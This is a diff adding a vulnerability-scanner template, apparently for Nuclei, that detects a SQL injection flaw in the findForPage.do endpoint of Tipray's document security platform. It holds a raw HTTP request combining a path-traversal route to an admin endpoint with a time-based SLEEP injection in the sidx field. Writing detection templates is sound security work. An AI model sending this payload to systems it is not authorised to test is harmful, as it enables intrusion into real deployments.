@@ -1,0 +1,40 @@
+id: poc-yaml-tipray-dsmp-findforpage-do-sqli
+info:
+  name: 天锐绿盘文档安全管理平台 findForPage.do SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in the `findForPage.do` endpoint of the 天锐绿盘文档安全管理平台.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /lddsm/service/../admin/bfclConfig/findForPage.do HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        page=1&rows=10&sidx=(SELECT * FROM (SELECT(SLEEP({{t1}})))x)
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"page\":"
+          - "\"name\":"
+      - type: word
+        part: header
+        words:
+          - "application/json"
+      - type: dsl
+        dsl:
+          - duration > to_number(t1)
+          - duration < to_number(t2)
